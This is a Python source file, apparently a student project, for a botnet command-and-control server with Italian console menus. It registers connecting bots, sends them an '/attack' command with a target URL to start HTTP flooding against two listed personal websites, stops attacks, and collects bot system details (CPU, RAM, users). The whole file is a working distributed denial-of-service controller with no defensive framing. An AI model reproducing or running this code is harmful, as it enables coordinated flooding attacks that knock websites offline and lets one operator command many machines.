import concurrent
import socket
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor

import requests

# server_address = ('10.0.2.15', 15200)
server_address = ('localhost', 15200)
clients = []


def initialize(e):
    """
    Initialize the server and listen for incoming connections.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_address[0], server_address[1]))
    s.listen(5)
    s.settimeout(2)
    while not e.is_set():
        try:
            client, port = s.accept()
            clients.append((client, port))
            data = client.recv(1024)
            print("--------------------------------------")
            print(f"Bot connected: {data.decode('utf-8')}")
            print("--------------------------------------")
        except socket.timeout:
            continue


def start_server():
    """
    Start a thread for the server and a thread to handle console input.
    It will wait for both threads to finish before exiting the program.
    """
    event = Event()
    with ThreadPoolExecutor(max_workers=2) as executor:
        x = executor.submit(initialize, event)
        y = executor.submit(handle_console, event)

        # Check if both threads are done
        concurrent.futures.wait([x, y], return_when=concurrent.futures.FIRST_COMPLETED)

        executor.shutdown(wait=False)


def handle_console(e):
    """
    Handle console input from the user.
    """
    while not e.is_set():
        print("1. Mostra tutti i client connessi")
        print("2. Effettua richieste http")
        print("3. Ferma attacco")
        print("4. Mostra informazioni di un client")
        print("0. Exit")
        scelta = int(input())

        if scelta == 0:
            print("Exiting...")
            find_bot(path='/stop-attack', method="GET")
            e.set()
            return
        elif scelta == 1:
            get_all_clients()
        elif scelta == 2:
            send_http_request()
        elif scelta == 3:
            find_bot(path='/stop-attack', method="GET")
        elif scelta == 4:
            find_bot(path='/client-info', method="GET")
        else:
            print("Scelta non valida")


def get_all_clients():
    """
    Print all the clients connected to the server
    """
    if len(clients) == 0:
        print("Nessun client connesso")
        return

    for key, client in enumerate(clients):
        print(f'Client {key + 1}: {client[1]}')


def send_http_request():
    """
    Start the attack of all the bots or of a specific bot
    """

    urls = [
        "https://federicoraponi.it/",
        "https://alessiopannozzo.it/",
    ]

    print("Seleziona un URL da attaccare: ")
    for key, url in enumerate(urls):
        print(f"{key + 1}. {url}")

    url = urls[int(input()) - 1]

    find_bot(path='/attack', method="POST", json={
        'url': url
    })


def print_client_info(client, res):
    print(f"Client Ip: {client}")
    print(f"CPU: {res.json()['cpu']}")
    print(f"CPU usage: {res.json()['cpu_usage']}%")
    print(f"RAM (GB): {res.json()['ram']}")
    print(f"RAM usage: {res.json()['ram']}%")
    print(f"System: {res.json()['system']}")
    print(f"Cores: {res.json()['cores']}")
    print(f"Total Cores: {res.json()['total_cores']}")
    print(f"Users: {res.json()['users']}")
    print("--------------------")


def find_bot(path, method, json=None):
    if len(clients) == 0:
        print("Nessun bot connesso")
        return

    if input("Voi utilizzare tutti i bot connessi? S/N: ") in ["S", "s"]:
        if method == "GET":
            for client in clients:
                res = requests.get(f"http://{client[1][0]}/{path}")
                # res = requests.get(f"http://{client[1][0]}:8080/{path}")
                if path == "/client-info":
                    print_client_info(client[1][0], res)
        elif method == "POST":
            for client in clients:
                res = requests.post(f"http://{client[1][0]}/{path}", json=json)
                # res = requests.post(f"http://{client[1][0]}:8080/{path}", json=json)
    else:
        client_ip = input("Inserisci l'Ip del bot di cui vuoi sapere le info: ")
        if client_ip not in [client[1][0] for client in clients]:
            print("Bot non trovato")
            return
        else:
            if method == "GET":
                res = requests.get(f"http://{client_ip}/{path}")
                # res = requests.get(f"http://{client_ip}:8080/{path}")
                if path == "/client-info":
                    print_client_info(client_ip, res)
            elif method == "POST":
                requests.post(f"http://{client_ip}/{path}", json=json)
                # requests.post(f"http://{client_ip}:8080/{path}", json=json)


if __name__ == '__main__':
    start_server()